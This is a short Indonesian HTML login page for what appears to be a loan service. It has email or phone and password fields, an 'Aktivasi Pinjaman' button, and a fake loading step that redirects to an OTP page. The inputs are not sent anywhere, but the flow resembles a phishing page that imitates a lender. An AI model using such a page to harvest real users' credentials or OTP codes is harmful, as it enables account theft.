<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: linear-gradient(to bottom right, #f9a825, #f57c00);
}

.container {
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 20px;
}

.card {
  width: 100%;
  max-width: 340px;
  background: #fff;
  border-radius: 22px;
  box-shadow: 0 12px 30px rgba(0,0,0,0.15);
  padding: 20px;
  text-align: center;
}

.slider {
  width: 100%;
  height: 140px;
  margin-bottom: 18px;
  border-radius: 16px;
  overflow: hidden;
}

.slider img {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

h2 {
  color: #f97316;
  margin: 10px 0 18px;
}

input {
  width: 92%;
  padding: 13px;
  margin: 7px 0;
  border: 1px solid #ddd;
  border-radius: 12px;
}

button {
  width: 95%;
  padding: 14px;
  margin-top: 14px;
  border-radius: 999px;
  border: none;
  background: linear-gradient(to right, #f59e0b, #f97316);
  color: #fff;
  font-weight: bold;
  cursor: pointer;
  transition: 0.2s;
}

button:active {
  transform: scale(0.97);
}
</style>
</head>

<body>

<div class="container">
  <div class="card">

    <div class="slider">
      <img src="artos.jpg">
    </div>

    <h2>Login</h2>

    <input type="text" placeholder="Email atau No HP">
    <input type="password" placeholder="Password">

    <button id="btnLogin">Aktivasi Pinjaman</button>

  </div>
</div>

<script>
document.getElementById("btnLogin").addEventListener("click", function() {

  let btn = this;

  // loading efek
  btn.innerText = "Memproses...";
  btn.style.opacity = "0.7";

  setTimeout(function(){
    window.location.href = "otp.html";
  }, 1200);

});
</script>

</body>
</html>
